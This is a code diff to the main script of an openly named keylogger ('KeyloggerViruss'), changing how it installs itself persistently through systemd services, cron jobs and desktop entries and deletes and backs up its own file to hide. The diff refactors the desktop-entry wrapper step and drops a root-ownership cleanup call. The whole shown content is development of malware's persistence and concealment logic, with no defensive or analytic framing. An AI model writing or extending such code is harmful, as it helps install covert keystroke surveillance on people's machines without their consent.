@@ -14,11 +14,11 @@ import sys
 import argparse
 import logging
 from pathlib import Path
-from config import IP, BACKUP_DIR, LIST_NEW_FILES
-from utils import get_file_name, _md5_of_file, self_backup_and_delete, create_dirs_if_not_exists, remove_roots_ownership
+from config import IP, BACKUP_DIR
+from utils import get_file_name, _md5_of_file, self_backup_and_delete, create_dirs_if_not_exists
 from persistance.setup_systemd import install_systemd_service, create_unit_content
 from persistance.setup_cron import create_bash_content, install_cron_job
-from persistance.setup_desktop_entry import install_desktop_entry, create_wrapper_script
+from persistance.setup_desktop_entry import install_desktop_entry, create_wrapper_script_content
 from keylogger import KeyloggerViruss
 
 
@@ -124,19 +124,17 @@ def main():
 
     # 1.c. Create desktop entry as a backup if requested
     if do_desktop:
-        wrapper_path = create_wrapper_script(progFileName=filename, progFileBackup=filename_md5)
-        if wrapper_path is None:
+        wrapper_script_content = create_wrapper_script_content(progFileName=filename, progFileBackup=filename_md5)
+        if wrapper_script_content is None:
             print("Error creating wrapper script.")
             return
-        if not install_desktop_entry(wrapper_path=wrapper_path):
+        if not install_desktop_entry(wrapper_script_content=wrapper_script_content):
             print("Error creating desktop entry.")
             return
         else:
             print("Desktop entry installed successfully.")
     else:
         print("Skipping desktop entry installation (user requested).")
-
-    remove_roots_ownership(LIST_NEW_FILES)
 
     # 2. Delete and create backup of itself
     try:
